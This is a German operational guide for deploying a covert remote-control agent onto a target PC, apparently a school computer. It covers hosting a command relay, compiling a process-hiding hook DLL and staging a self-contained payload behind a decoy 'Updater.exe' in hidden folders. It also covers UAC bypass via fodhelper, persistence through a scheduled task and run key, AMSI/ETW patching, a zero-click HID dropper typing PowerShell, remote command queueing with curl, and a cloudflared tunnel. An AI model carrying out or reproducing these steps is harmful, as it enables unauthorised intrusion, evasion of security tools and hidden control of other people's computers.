# Deployment-Guide — Relay, Stealth-Agent, USB-Drop

Diese Anleitung beschreibt den zweiten Betriebsweg neben dem lokalen WLAN-Modus aus `README.md`: Relay im Internet, Agent auf dem Ziel-PC, Steuerung vom Handy aus einem beliebigen Netz.

Reihenfolge: **1 → 2 → 3 → 4 → 5 → 6**, Abschnitt 7 ist optional.

---

## 1. Relay online bringen (Render)

### 1.1 account

- geh zu https://render.com → sign up (github ok)

### 1.2 new web service

- dashboard → **New +** → **Web Service**
- statt repo: **Public Git repository** oder besser **Blueprint / manual**
- einfachster weg ohne git:

**option a — glitch (schneller zum testen)**

1. https://glitch.com → **New Project** → `glitch-hello-node` (oder blank)
2. alle default-files löschen
3. neue datei `server.js` anlegen, inhalt von `pc-app/relay.js` reinkopieren (bei glitch heißt der entry oft `server.js`)
4. in `package.json` nur:

```json
{
  "name": "panic-relay",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": { "start": "node server.js" },
  "engines": { "node": ">=18" }
}
```

5. **Share** → live-url notieren, z.b. `https://irgendwas.glitch.me`

**option b — render**

1. github-repo mit nur `relay.js` + `package.json` (gleich wie oben, `main: relay.js`, `start: node relay.js`)
2. render → new web service → repo wählen
3. **Runtime:** Node
   **Build Command:** (leer lassen)
   **Start Command:** `node relay.js`
4. **create** → warte bis **Live**
5. url notieren: `https://panic-relay.onrender.com`

fertig vorbereitet im repo: `relay-deploy/` enthält genau `relay.js` + `package.json` + `render.yaml`. diesen ordner als repo-root pushen, in render **New + → Blueprint** wählen, rest kommt aus dem yaml.

### 1.3 test

```bash
curl https://DEINE-URL/api/status
```

sollte so aussehen: `{"online":false,"timestamp":0,"info":null}`

---

## 2. RELAY_URL in StealthAgent setzen

datei: `pc-app/StealthAgent.cs` — die konstante steht in **zeile 19**.

suche:

```csharp
private const string RELAY_URL = "https://your-panic-relay.onrender.com";
```

ersetze durch deine echte url, ohne trailing slash:

```csharp
private const string RELAY_URL = "https://panic-relay.onrender.com";
```

speichern.

**ohne rebuild:** der Agent liest die url auch zur laufzeit, in dieser reihenfolge:

1. umgebungsvariable `PANIC_RELAY_URL`
2. datei `relay.url` neben `ClassroomHelper.exe` (bzw. in `C:\ProgramData\Microsoft\Windows\ClassroomHelper\`) — vorlage: `relay.url.example`, eine zeile, kein trailing slash
3. sonst die kompilierte konstante

damit kannst du den relay auf einer bereits installierten kiste tauschen, ohne neu zu bauen.

---

## 3. framedata.dll bauen (Windows, Visual Studio)

### 3.1 tools

- Visual Studio 2022 installieren (Community reicht)
- bei installation: workload **„Desktop development with C++"** anhaken
- danach im startmenü: **x64 Native Tools Command Prompt for VS 2022** öffnen

### 3.2 compile

```bat
cd C:\pfadzu\pc-app
cl /LD /O2 /W4 /permissive- WinAudioSrvHook.cpp /link /OUT:framedata.dll user32.lib
```

wenn erfolgreich:

- `framedata.dll` liegt im gleichen ordner
- `WinAudioSrvHook.obj` kannst du löschen

### 3.3 falls `cl` nicht gefunden

- VS Installer → **Modify** → **Individual components** → `MSVC v143 - VS 2022 C++ x64/x86 build tools` + `Windows 10/11 SDK` sicherstellen

---

## 4. Single-File .exe bauen (USB_BUILD)

### 4.1 voraussetzungen auf deinem pc

- .NET 8 **SDK**: https://dotnet.microsoft.com/download/dotnet/8.0
  (x64 Installer, **„SDK"** nicht nur Runtime)

check:

```bat
dotnet --version
```

sollte `8.x.x` sein.

### 4.2 build

```bat
cd C:\pfadzu\pc-app
USB_BUILD.bat
```

oder manuell:

```bat
dotnet publish -c Release -r win-x64 --self-contained true ^
  -p:PublishSingleFile=true ^
  -p:IncludeNativeLibrariesForSelfExtract=true ^
  -p:DebugType=none ^
  -o USB_PAYLOAD\system_drv
```

### 4.3 ergebnis

```text
USB_PAYLOAD\
  Updater.exe          ← decoy-name, kopieren auf stick-root optional
  system_drv\
    ClassroomHelper.exe   ← eigentliche payload
    web\ ...
    actions.json
```

### 4.4 dll daneben legen

```bat
copy /Y framedata.dll USB_PAYLOAD\system_drv\framedata.dll
attrib +h +s USB_PAYLOAD\system_drv\framedata.dll
attrib +h +s USB_PAYLOAD\system_drv
```

---

## 5. USB vorbereiten

### variante a — manueller start (einfach)

1. stick formatieren (exfat oder ntfs)
2. ordner `system_drv` komplett raufkopieren (hidden+system bleibt)
3. optional `Updater.exe` in root legen
4. am ziel-pc: `Updater.exe` doppelklicken oder `system_drv\ClassroomHelper.exe` starten
   → wenn admin-account: fodhelper-elevate → install nach `C:\ProgramData\Microsoft\Windows\ClassroomHelper\` → task + run key → original process beendet sich

### variante b — zero-click HID (RP2350 / ESP32-S3)

1. Arduino IDE + board-support:
   - ESP32: boards manager → `esp32` by Espressif
   - RP2350: je nach core (z.b. earlephilhower / official pico)
2. board wählen, **USB-Stack: TinyUSB / HID enabled**
3. `HID_Dropper.ino` öffnen, flashen
4. stick mit `system_drv\ClassroomHelper.exe` stecken und HID-board (oder kombiniert)
5. board tippt nach ~1.2s `Win+R` + powershell one-liner → startet exe hidden

---

## 6. Handy / controller → befehl an den pc

`school-pc` pollt alle **800 ms** `POST /api/poll`.

befehl queueen (vom handy, anderem netz, egal):

```bash
curl -X POST https://DEINE-RELAY-URL/api/command \
  -H "Content-Type: application/json" \
  -d '{"cmd":"action","action":"lock"}'
```

oder beliebiges action-id aus `actions.json`, z.b.:

```json
{"cmd":"action","action":"stopAll"}
{"cmd":"action","action":"winLoop"}
{"action":"closeOverlays"}
```

status prüfen:

```bash
curl https://DEINE-RELAY-URL/api/status
```

wenn pc online: `"online": true` + timestamp.

---

## 7. optional — volles web-ui weltweit (cloudflared)

wenn du nicht nur relay-commands willst, sondern das echte `index.html` dashboard:

1. cloudflared downloaden: https://github.com/cloudflare/cloudflared/releases
2. `cloudflared.exe` nach `C:\ProgramData\Microsoft\Windows\ClassroomHelper\` (oder USB-bundle) legen
3. in `InstallSystemWide` (oder manuell nach install) einmal:

```bat
cloudflared.exe tunnel --url http://127.0.0.1:8443
```

(port so wie dein LocalServer lauscht — bei dir typisch 8443 https loopback)

gibt dir eine `https://xxxx.trycloudflare.com` url → handy-browser.

---

## Kurzreferenz

| Datei | Zweck |
|---|---|
| `relay.js` | Relay mit `/api/command`, `/api/poll`, `/api/status` |
| `StealthAgent.cs` | Bootstrap: AMSI/ETW-Patch, UAC-Bypass, Install, Taskmgr-Cloak, Relay-Poll |
| `WinAudioSrvHook.cpp` | Quelle für `framedata.dll` (NtQuerySystemInformation-Hook) |
| `HID_Dropper.ino` | Zero-Click-Launcher für RP2350 / ESP32-S3 |
| `USB_BUILD.bat` | Self-contained Single-File-Publish + USB-Staging |
| `actions.json` | gültige `action`-IDs für Relay und UI |
